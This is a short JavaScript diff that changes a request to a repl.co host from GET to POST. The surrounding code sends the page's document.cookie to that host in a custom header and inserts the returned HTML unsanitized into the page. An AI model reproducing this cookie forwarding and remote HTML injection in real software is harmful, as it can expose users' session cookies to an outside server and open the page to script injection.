@@ -78,7 +78,7 @@ const login=await (await fetch("https://thscripts.haru-ymth.repl.co/login",{
     })
   })).text();
 if(login=="true"){
-  document.getElementById("container").innerHTML=await (await fetch("https://thscripts.haru-ymth.repl.co",{headers:{"x-cookie":document.cookie}})).text();
+  document.getElementById("container").innerHTML=await (await fetch("https://thscripts.haru-ymth.repl.co",{method:"POST",headers:{"x-cookie":document.cookie}})).text();
    
 }
  })()
